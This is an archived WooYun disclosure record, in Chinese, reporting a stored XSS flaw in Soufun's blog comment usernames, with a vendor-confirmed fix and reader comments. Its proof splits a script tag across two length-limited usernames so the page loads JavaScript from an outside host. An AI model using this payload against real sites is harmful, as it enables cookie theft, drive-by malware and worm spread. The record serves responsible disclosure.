{"id": 15318, "wybug_id": "wooyun-2012-015033", "wybug_title": "搜房网博客系统严重存储型XSS", "wybug_corp": "搜房网", "wybug_author": "Rkit", "wybug_date": "2012-11-21 12:28", "wybug_open_date": "2013-01-05 12:29", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "搜房网"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-11-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-12-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-12-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-05：\t细节向公众公开  简要描述： 搜房网博客系统，http://blog.soufun.com 存在严重XSS， 可在用户博客首页插入XSS代码。轻则可导致对单一博客获取COOKIE或者挂马，重则可以编写XSS蠕虫传播。 详细说明：  1. 漏洞出现在评论发表的用户名及博文标题处，用户名经过研究，可以利用。2. 找一个博客用户，为了不影响其他用户，这里我注册了一个http://blog.soufun.com/rkit 。3. 随便进入一篇博文的详细页面，在评论处的用户名处，输入特殊字符，如',\",>,<，等进行判断，未被过滤。4. 在构造利用代码的过程中，有几点限制：    1> 用户名长度限制不能超过20个字符。    2> 单纯的<script 不会过滤，但如果加入右尖括号，整个代码将被过滤。5. 经过研究，最少可以发表两条评论即可利用成功。证明见下。   漏洞证明：  1.  用指定用户名发表评论，用户名： \"src=http://rkit.cn?    2.  用指定用户名发表评论，用户名： <script a=\"3.  到此，此片段的html代码为： \n\n4.  访问博文： \n\n5.  因为最新评论会更新在博客首页，所以首页也会受影响。\n\n危害；1. 只需要更改rkit.cn上面的JS代码，即可完成挂马，蠕虫传播等行为。2. 由于是匿名发表，所以可以针对任何博客进行攻击。   修复方案：  1. 完善过滤   版权声明：转载请注明来源 Rkit@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-11-21 13:22 厂商回复： 立刻修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-21 22:02 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  这个接的技巧碉堡！    \n     2013-01-05 17:49 |    \t\tStream \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 低头要有勇气，抬头要有底气!)\t\t \n  这个接的技巧碉堡！    \n     2013-01-06 09:25 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  这个接的技巧碉堡！    \n     2013-08-05 10:33 |    \t\tlhshaoren \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:7        | OM)\t\t \n  nice    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}